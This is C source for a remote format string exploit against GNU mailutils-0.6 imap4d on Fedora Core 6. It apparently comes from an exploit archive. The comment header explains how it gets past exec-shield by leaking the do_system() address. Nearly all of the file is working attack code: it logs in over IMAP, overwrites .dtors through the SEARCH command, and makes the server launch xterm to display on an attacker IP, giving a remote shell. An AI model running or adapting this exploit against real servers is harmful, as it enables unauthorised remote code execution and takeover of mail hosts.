/*
**
** Fedora Core 6 (exec-shield) based
** GNU imap4d mailutils-0.6 search remote format string exploit
** by Xpl017Elz
**
** Advanced exploitation in exec-shield (Fedora Core case study)
** URL: http://x82.inetcop.org/h0me/papers/FC_exploit/FC_exploit.txt
**
** Reference: http://www.securityfocus.com/bid/14794 (2005/09/09)
** http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=303
**
** --
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
** My World: http://x82.inetcop.org
**
*/
/*
** -=-= POINT! POINT! POINT! POINT! POINT! =-=-
**
** This vulnerability is one of the normal exploitation case under exec-shield.
** GNU imap4d can be run as a standalone deamon by using -d option and it inherits 
** virtual address of parent process which mapped randomly.
**
** [root@localhost .libs]# ps -ef | grep imap4d | grep -v grep
** root      8312     1  0 20:01 ?        00:00:00 ./lt-imap4d -d
** [root@localhost .libs]#
**
** These are keys to get over some possible problems.
**
** * `One shot' exploit without brute-forcing.
**
** Sometimes you man need to do some brute-forcing to assume the library address 
** which is mapped randomly. But this is not my recommendation.
**
** Because it is a format string attack, we can possibly get the ramdom address
** of the library. Using this technique, I could find exploitable do_system()
** address at once. but, unfortunately, it is not applicable to blind format string
** exploit by syslog().
**
** * How to execute a remote shell.
**
** I decided to use xterm for this, but if sadly, there is no xterm on the target
** server then you should look for another way. because of the variableness
** of size of IP address, I felt a need for fitting the address within 10 bytes. 
**
** Hacker's IP address would be a perfect demical numbers and it makes size
** of IP address same and shortens the string to overwrite. 
**
** xterm exploit code includes do_system() address can be writen in 136 bytes
** of general exploit code.
**
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define DEF_STR "x0x"
#define PORT 143

#define DF_SFLAG 11
#define DF_OFFSET 29
#define DTOR_END_ADDR 0x08059268
#define DO_SYSTEM 0x828282
#define SHELL 0x3b6873
#define DEF_DO_SYSTEM_OFFSET 0x1fbf9
#define GET_DO_SYSTEM_SFLAG 38

#define XHOST_IP "82.82.82.82"

void banrl();
void usage();
void re_connt(int sock);
int setsock(char *host,int port);


long xterm_shell[]={ // do_system("xterm -di ip_addr");
	0x7478,0x7265,
	0x206d,0x642d,
	0x2069,0x4141, /* IP address */
	0x4141,0x4141,
	0x4141,0x4141,
	0x303a,0x0000
};
int xterm_ip_count=5;


int get_10_ip(char *ipbuf){
	char tbuf[32];
	int i=0;
	unsigned long ip,ip1,ip2,ip3,ip4;
	ip=ip1=ip2=ip3=ip4;

	sscanf(ipbuf,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
#define IP1 16777216
#define IP2 65536
#define IP3 256
	ip=0;
	ip+=ip1 * (IP1);
	ip+=ip2 * (IP2);
	ip+=ip3 * (IP3);
	ip+=ip4;

	memset((char *)ipbuf,0,256);
	sprintf(ipbuf,"%lu",ip);
	xterm_ip_count=5;

	for(i=0;i<10;i+=2){
		memset((char *)tbuf,0,sizeof(tbuf));
		snprintf(tbuf,sizeof(tbuf)-1,"0x%02x%02x",ipbuf[i+1],ipbuf[i]);

		ip=strtoul(tbuf,NULL,0);
		xterm_shell[xterm_ip_count++]=ip;
	}
	return 0;
}

int send_exploit_code(int sock,unsigned long retloc,unsigned long retaddr,int sflag){
	char buf[1024];
	int i=0;

	memset((char *)buf,0,sizeof(buf));
	snprintf(buf,sizeof(buf)-1,"1 search topic x");
	i=strlen(buf);
	*(long *)&buf[i]=retloc;
	i+=4;
	if(retaddr==0){
		retaddr+=0x10000;
	}
	sprintf(buf+i,"%%%lux%%%d$n\n",retaddr-i-DF_OFFSET,sflag);

	send(sock,buf,strlen(buf),0);
	memset(buf,0,sizeof(buf));
	while(recv(sock,buf,sizeof(buf)-1,0)){
		if(strstr(buf,")")){
			break;
		}
	}
	return 0;
}

int main(int argc,char *argv[]){
	int sflag=DF_SFLAG;
	unsigned long do_system_addr=DO_SYSTEM;
	unsigned long retloc=DTOR_END_ADDR;
	unsigned long shaddr=SHELL;
	char host[256]=DEF_STR;
	int port=PORT;
	extern char *optarg;
	int sock,i,r=0;
	char buf[1024];
	char user[256]=DEF_STR;
	char pass[256]=DEF_STR;
	char *ptr=NULL;
	char xhost_ip_buf[256]=XHOST_IP;

	get_10_ip(xhost_ip_buf);

	memset((char *)buf,0,sizeof(buf));
	memset((char *)user,0,sizeof(user));
	memset((char *)pass,0,sizeof(pass));

	(void)banrl();
	while((sock=getopt(argc,argv,"R:r:D:d:H:h:P:p:F:f:I:i:U:u:S:s:"))!=EOF){
		switch(sock){
			case 'R':
			case 'r':
				retloc=strtoul(optarg,NULL,0);
				break;
			case 'D':
			case 'd':
				do_system_addr=strtoul(optarg,NULL,0);
				break;
			case 'H':
			case 'h':
				memset((char *)host,0,sizeof(host));
				strncpy(host,optarg,sizeof(host)-1);
				break;
			case 'P':
			case 'p':
				port=atoi(optarg);
				break;
			case 'F':
			case 'f':
				sflag=atoi(optarg);
				break;
			case 'I':
			case 'i':
				memset((char *)xhost_ip_buf,0,sizeof(xhost_ip_buf));
				strncpy(xhost_ip_buf,optarg,sizeof(xhost_ip_buf)-1);
				get_10_ip(xhost_ip_buf);
				break;
			case 'U':
			case 'u':
				memset((char *)user,0,sizeof(user));
				strncpy(user,optarg,sizeof(user)-1);
				break;
			case 'S':
			case 's':
				memset((char *)pass,0,sizeof(pass));
				strncpy(pass,optarg,sizeof(pass)-1);
				break;
			case '?':
			default:
				(void)usage(argv[0]);
				break;
		}
	}
	if(!strcmp(host,DEF_STR)||!strcmp(user,DEF_STR)||!strcmp(pass,DEF_STR)){
		(void)usage(argv[0]);
	}

	fprintf(stdout," [+] make socket.\n");
	fprintf(stdout," [+] host: %s.\n",host);
	fprintf(stdout," [+] port: %d.\n",port);
	sock=setsock(host,port);
	re_connt(sock);

	recv(sock,buf,sizeof(buf)-1,0);
	if(strstr(buf,"IMAP4rev1")){
		fprintf(stdout," [+] OK, IMAP4rev1.\n");
	}
	else {
		fprintf(stdout," [-] Ooops, no match.\n\n");
		close(sock);
		exit(-1);
	}

	memset((char *)buf,0,sizeof(buf));
	snprintf(buf,sizeof(buf)-1,"1 login \"%s\" \"%s\"\n",user,pass);
	send(sock,buf,strlen(buf),0);
	memset((char *)buf,0,sizeof(buf));
	while(recv(sock,buf,sizeof(buf)-1,0)){
		if(strstr(buf," Completed")){
			fprintf(stdout," [+] login completed.\n");
			break;
		}
		else if(strstr(buf," rejected")){
			fprintf(stdout," [-] login failed.\n\n");
			exit(-1);
		}
	}

	memset((char *)buf,0,sizeof(buf));
	snprintf(buf,sizeof(buf)-1,"1 select \"inbox\"\n");
	send(sock,buf,strlen(buf),0);
	memset((char *)buf,0,sizeof(buf));
	while(recv(sock,buf,sizeof(buf)-1,0)){
		if(strstr(buf," Completed")){
			fprintf(stdout," [+] select success.\n");
			break;
		}
		else if(strstr(buf," NO SELECT")){
			fprintf(stdout," [-] select failed.\n\n");
			exit(-1);
		}
	}


	/* get, do_system address */
	fprintf(stdout," [+] find do_system address.\n");
	memset((char *)buf,0,sizeof(buf));
	snprintf(buf,sizeof(buf)-1,"1 search topic |%%%d$x|\n",GET_DO_SYSTEM_SFLAG);
	send(sock,buf,strlen(buf),0);
	memset((char *)buf,0,sizeof(buf));
	recv(sock,buf,sizeof(buf)-1,0);
	if(strstr(buf,"|")){
		ptr=(char *)strstr(buf,"|");
		sscanf(ptr,"|%x|\n",&do_system_addr);
	}
	do_system_addr-=DEF_DO_SYSTEM_OFFSET;

	fprintf(stdout," [+] make exploit code.\n");
	fprintf(stdout," [+] retloc address: %p.\n",retloc);
	fprintf(stdout," [+] do_system address: %p.\n",do_system_addr);
	fprintf(stdout," [+] send exploit code.\n");

	send_exploit_code(sock,retloc,do_system_addr,sflag);
	for(i=0,r=4;i<(sizeof(xterm_shell)/4);i++,r+=2){
		send_exploit_code(sock,retloc+r,xterm_shell[i],sflag);
	}


#define LOGOUT_CMD "1 logout\n"
	send(sock,LOGOUT_CMD,strlen(LOGOUT_CMD),0);
	sleep(1);

	recv(sock,buf,sizeof(buf)-1,0);
	close(sock);

	if(strstr(buf,"BYE")&&strstr(buf,"LOGOUT")){
		fprintf(stdout," [+] logout success.\n\n");
	}
	else {
		fprintf(stdout," [-] logout failed.\n\n");
		exit(-1);
	}
	exit(0);
}

void banrl(){
	fprintf(stdout,"\n FC6 (exec-shield) based GNU imap4d mailutils-0.6 search remote exploit\n");
	fprintf(stdout," by Xpl017Elz\n\n");
}

void usage(char *arg0){
	fprintf(stdout," Usage: %s -options arguments\n\n",arg0);

	fprintf(stdout,"\t-r [retloc]    - .dtors address (default: %p).\n",DTOR_END_ADDR);
	fprintf(stdout,"\t-d [do_system] - do_system address (auto).\n");
	fprintf(stdout,"\t-h [host]      - target hostname or ip.\n");
	fprintf(stdout,"\t-p [port]      - target port number (auto).\n");
	fprintf(stdout,"\t-f [sflag]     - $-flag number (default: 11).\n");
	fprintf(stdout,"\t-i [ip]        - attacker xhost ip.\n");
	fprintf(stdout,"\t-u [user]      - imap user id.\n");
	fprintf(stdout,"\t-s [pass]      - imap user pass.\n");
	fprintf(stdout,"\t-?             - help information.\n\n");

	fprintf(stdout," Example: %s -hhost -iattacker -ux82 -spass\n\n",arg0);
	exit(-1);
}


void re_connt(int sock){
	if(sock==-1)
	{
		fprintf(stdout," [-] Failed.\n\n");
		exit(-1);
	}
}
 
int setsock(char *host,int port)
{
	int sock;
	struct hostent *he;
	struct sockaddr_in x82_addr;
 
	if((he=gethostbyname(host))==NULL)
	{
		return(-1);
	}

	if((sock=socket(AF_INET,SOCK_STREAM,0))==EOF)
	{
		return(-1);
	}
    
	x82_addr.sin_family=AF_INET;
	x82_addr.sin_port=htons(port);
	x82_addr.sin_addr=*((struct in_addr *)he->h_addr);
	bzero(&(x82_addr.sin_zero),8);
 
	if(connect(sock,(struct sockaddr *)&x82_addr,sizeof(struct sockaddr))==EOF)
	{
		return(-1);
	}
	return(sock);
}

/* eoc */

// milw0rm.com [2007-04-24]
